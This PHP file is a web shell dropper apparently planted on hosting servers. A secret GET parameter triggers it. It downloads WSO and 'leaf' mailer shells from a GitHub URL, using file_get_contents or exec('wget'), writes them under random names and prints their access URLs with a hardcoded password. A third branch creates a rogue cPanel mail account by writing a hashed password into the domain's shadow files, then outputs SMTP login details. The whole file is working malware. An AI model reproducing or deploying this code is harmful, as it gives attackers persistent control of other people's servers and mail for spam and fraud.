<?php
//unlink('.htaccess');
//unlink('.user.ini');
//unlink('.USER.ini');
if (function_exists('file_get_contents') && $_GET["jib"] == "l9wada")  {
    $htaccess = "https://raw.githubusercontent.com/3Mi7/STR7/main/shell20201123.php";
    $f = 'file_';
    $g = 'get_';
    $c = 'contents';
    $fun = $f.$g.$c;
    $file = $fun($htaccess);
    $ra = rand(100, 1000000);
    $open = fopen("wso-".$ra.".php" , 'w');
    fwrite($open,$file);
    fclose($open);
    $site = $_SERVER['HTTP_HOST'];
    if($open) {
        echo "http://$site/wso-$ra.php<br>";
    }
    else {
         echo "<br>[-] Error [-]<br>";
     }

    $cgi = "https://raw.githubusercontent.com/3Mi7/STR7/main/ezleaf-873716.php";
    $file = $fun($cgi);
    $ra = rand(100, 1000000);
    $open = fopen("leaf-".$ra.".php" , 'w');
    fwrite($open,$file);
    fclose($open);
    $site = $_SERVER['HTTP_HOST'];
     if($open) {
        echo "http://$site/leaf-$ra.php?pass=3mixs3113r134x<br>";
     } else {
         echo "<br>[-] Error [-]<br>";
     }
} 
elseif (function_exists('exec') && $_GET["jib"] == "l9laoui") {
    echo "EXEC Exist <br />\n";
    $htaccess = "https://raw.githubusercontent.com/3Mi7/STR7/main/shell20201123.php";
    $ra2 = rand(1000, 1000000);
    $benx = exec("wget ".$htaccess." -O "."wso-".$ra2.".php" );
    $site = $_SERVER['HTTP_HOST'];
    if(!$benx) {
        echo "http://$site/wso-$ra2.php<br>";
    } else {
        echo "<br>[-] Error [-]<br>";
    }
    $eleaf = "https://raw.githubusercontent.com/3Mi7/STR7/main/ezleaf-873716.php";
    $ra3 = rand(1000, 1000000);
    $benx2 = exec("wget ".$eleaf." -O "."eleaf-".$ra3.".php" );
    $site = $_SERVER['HTTP_HOST'];
    if(!$benx2) {
        echo "http://$site/eleaf-$ra3.php?pass=3mixs3113r134x<br>";
    } else {
        echo "<br>[-] Error [-]<br>";
    }
}
elseif ($_GET["jib"] == "zabi") {
    $pwd = @getcwd();
	if(!function_exists('posix_getegid')) {
		$usr = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$usr = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}if (empty($usr)) {
		if (preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx)){
			preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx);
			$usr = $mxx[1][0];
			}
	}
	preg_match_all("#/home(.*)$usr/#",$pwd,$m2);
	$home = $m2[1][0];
	$domain = $_SERVER['HTTP_HOST'];
	$ip = $_SERVER["SERVER_ADDR"];
	if(strstr($domain, 'www.')){
		$domain = str_replace("www.","",$domain);
	}else{
		$domain = $domain;
	}
	$cp = "/home$home$usr/.cpanel";
	if (is_dir($cp)) {
		$pass = "KRYPTO-".substr(str_shuffle("123456789abcdefghijklmnopqrsyuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),50)."-MAD";
		$pwd=crypt($pass,'$6$roottn$');
		$smtpname = 'webinar';
		@mkdir("/home$home$usr/etc/$domain");
		@mkdir("/home$home$usr/mail/$domain");
		@mkdir("/home$home$usr/mail/$domain/$smtpname");
		@mkdir("/home$home$usr/mail/$domain/$smtpname/.Archive");
		@mkdir("/home$home$usr/mail/$domain/$smtpname/.Drafts");
		@mkdir("/home$home$usr/mail/$domain/$smtpname/.Sent");
		@mkdir("/home$home$usr/mail/$domain/$smtpname/.spam");
		@mkdir("/home$home$usr/mail/$domain/$smtpname/.Trash");
		@mkdir("/home$home$usr/mail/$domain/$smtpname/cur");
		@mkdir("/home$home$usr/mail/$domain/$smtpname/new");
		@mkdir("/home$home$usr/mail/$domain/$smtpname/tmp");
		$file1 = "/home$home$usr/mail/$domain/$smtpname/dovecot-acl-list";fwrite(fopen($file1,"a"),'');
		$file2 = "/home$home$usr/mail/$domain/$smtpname/dovecot-uidlist";fwrite(fopen($file2,"w"),'3 V1578724087 N1 G6789ba31f76a195e040b0000cb0407e2');
		$file3 = "/home$home$usr/mail/$domain/$smtpname/dovecot-uidvalidity";fwrite(fopen($file3,"w"),'5e196afc0');
		$file4 = "/home$home$usr/mail/$domain/$smtpname/dovecot-uidvalidity.5e196afc";fwrite(fopen($file4,"a"),'');
		$file5 = "/home$home$usr/mail/$domain/$smtpname/dovecot.index.log";fwrite(fopen($file5,"a"),'');
		$file6 = "/home$home$usr/mail/$domain/$smtpname/dovecot.list.index.log";fwrite(fopen($file6,"a"),'');
		$file7 = "/home$home$usr/mail/$domain/$smtpname/dovecot.mailbox.log";fwrite(fopen($file7,"a"),'');
		$file8 = "/home$home$usr/mail/$domain/$smtpname/maildirsize";fwrite(fopen($file8,"w"),"2147483647C\n0 0");
		$file9 = "/home$home$usr/mail/$domain/$smtpname/subscriptions";fwrite(fopen($file9,"w"),"V	2\n\nArchive\nDrafts\nSent\nspam\nTrash");
		$smtp = $smtpname.':'.$pwd.':16249:::::'."\r\n";
		$shadow1 = "/home$home$usr/etc/$domain/shadow";
		$shadow2 = "/home$home$usr/etc/shadow";
		$shadow1_content = file_get_contents($shadow1);
		$shadow2_content = file_get_contents($shadow2);
		if(preg_match("/$smtpname/",$shadow1_content)){
			$pathe_msg = "/home$home$usr/mail/$domain/$smtpname/new";
			$scan_msg = scandir($pathe_msg);
			foreach($scan_msg as $file_msg) {
				unlink("$pathe_msg/$file_msg");
			}
			unlink($shadow1);
			}
		if(preg_match("/$smtpname/",$shadow2_content)){unlink($shadow2);}
		$fo=fopen($shadow1,"a");
		fwrite($fo,$smtp);
		$fo2=fopen($shadow2,"a");
		fwrite($fo2,$smtp);
		echo "<smtp>$domain|587|$smtpname@$domain|$pass</smtp>\n";
	}
}
?>